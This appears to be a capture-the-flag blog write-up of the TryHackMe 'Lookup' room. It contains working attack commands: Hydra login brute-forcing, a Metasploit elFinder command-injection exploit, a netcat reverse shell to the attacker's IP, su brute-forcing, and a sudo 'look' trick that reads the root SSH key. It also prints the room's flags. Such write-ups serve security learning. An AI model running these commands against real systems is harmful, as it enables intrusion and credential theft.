---
layout: post
title: Lookup
date:  2025-07-13 23:00:00 +0530 
categories: [Tryhackme]
tags: [hacking, tryhackme, namp, smbclient, brupsuite,Nikto,brute-force, ftp, ssh, relate] # TAG names should always be lowercase 
render_with_liquid: false
media_subpath: /images/Lookup/
---

# üïµÔ∏è‚Äç‚ôÇÔ∏è Lookup | Writeup | 13 July 2025

![TryHackMe Logo](THM.png)
![Overpass_image](Lookup_logo.png)

---

**Author:** *Aakash Modi*

---

## üõ∞Ô∏è Reconnaissance & Scanning

### üîç Host Discovery

First, add the target host's IP to `/etc/hosts` as `lookup.thm`:

```bash
sudo nano /etc/hosts
# Add the following line:
<IP_address>   lookup.thm
```

![Hosts File](hosts.png)

---

### üîé Nmap Scan / Port Scanning

Run a full port scan with service and version detection:

```bash
sudo nmap -T4 -n -sC -sV -Pn -p- -oN fastscan.txt lookup.thm
```

![Nmap Scan Screenshot](nmap_scan.png)

---

### üïµÔ∏è Nikto Scan

Scan for web vulnerabilities:

```bash
nikto -h http://lookup.thm/ -o nikto_scan.txt
```

![Nikto Scan](nikto.png)

---

### üß∞ Burp Suite Enumeration

Use Burp Suite Intruder to enumerate usernames:

![Burp Intruder](browser_intruder.png)

- Found valid username:
  ![Username Correct](username_correct_Burp.png)
- Testing other usernames:
  ![Wrong Username/Password](username_password_wrong_burp.png)

---

### üîì Hydra Brute Force

#### Find Usernames

```bash
hydra -L /usr/share/wordlists/rockyou.txt -p admin lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=wrong username or password" -V
```

![Finding Username](finding_username.png)

- Discovered users:
  1. admin
  2. jose

![Found Username](found_username.png)

#### Find Password

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=wrong password" -V
```

![Finding Password](finding_password.png)

- **Found credentials:**  
  `username: jose`  
  `password: password123`

---

## üö™ Exploitation

- Login to dashboard:
  ![Dashboard Access](gain_access_dashboard.png)
- Found SSH credentials:
  ![SSH Credentials](get_username_cred.png)

#### Search for Exploits

```bash
searchsploit elfinder
```

![Find Exploit](find_exploit_elfinder.png)

#### Metasploit Exploitation

```bash
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS files.lookup.thm
set LHOST <your_ip>
exploit
```

![Metasploit Exploit](metasploit_exploit.png)

- Get a shell:
  ```bash
  shell
  busybox nc <your_ip> 1111 -e bash
  ```
- Stabilize shell:
  ```bash
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  export TERM=xterm-256color
  cd /tmp
  ```

![Tmp Directory](tmp.png)

---

## üöÄ Privilege Escalation

- Find SUID binaries:
  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```
  ![Finding Vulnerabilities](finding_vul.png)

- Update PATH:
  ```bash
  export PATH=/tmp:$PATH
  ```

- Use password list and brute-force with [suBF.sh](https://raw.githubusercontent.com/carlospolop/su-bruteforce/refs/heads/master/suBF.sh):

  ```bash
  chmod +x suBF.sh
  ./suBF.sh -u think -w password.txt
  ```

  ![Think Password](think_password.png)

- Check sudo permissions:
  ```bash
  sudo -l
  ```
  ![Sudo List](sudo_l.png)

- Use `look` command for privilege escalation ([GTFOBins](https://gtfobins.github.io/gtfobins/look/)):
  ```bash
  sudo look "" user.txt
  ```
  - **User flag:** `38375fb4dd8baa2b2039ac03d92b820e`
  ![Look Command](look.png)

- Extract root SSH key:
  ```bash
  sudo look "" /root/.ssh/id_rsa
  ```
  ![SSH Key](ssh_key.png)

- Copy SSH key to your machine:
  ```bash
  nano id_rsa
  chmod 600 id_rsa
  ```
  ![SSH Key on Machine](ssh_key_m_machine.png)

- SSH as root:
  ```bash
  ssh -i id_rsa root@files.lookup.thm
  ```
  ![Root Access](root_access.png)

- **Root flag:** `5a285a9f257e45c68bb6c9f9f57d18e8`
  ![Root Flag](root_flag.png)

---

## üõ†Ô∏è Tools Used

- Nmap
- Nikto
- Hydra
- Burp Suite
- Netcat (nc)
- Searchsploit
- Metasploit

---

## üéØ Conclusion

- All tasks completed successfully!

<div align="center">
  <img src="completed.png" alt="Room Completed" width="900" hight="400"/>
</div>

---

## üéâ Happy Hacking!

<div align="center">
    <a href="https://giphy.com/gifs/charlie-hunnam-gif-hunt-102h4wsmCG2s12">
        <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjc2ZjJub3Vpa2xhMHhiYnRqcnd4NDVmdm85YzJ0aWhmbTUzOWpqdiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/78XCFBGOlS6keY1Bil/giphy.gif" alt="Charlie Hunnam GIF" width="400"/>
    </a>
</div>

---
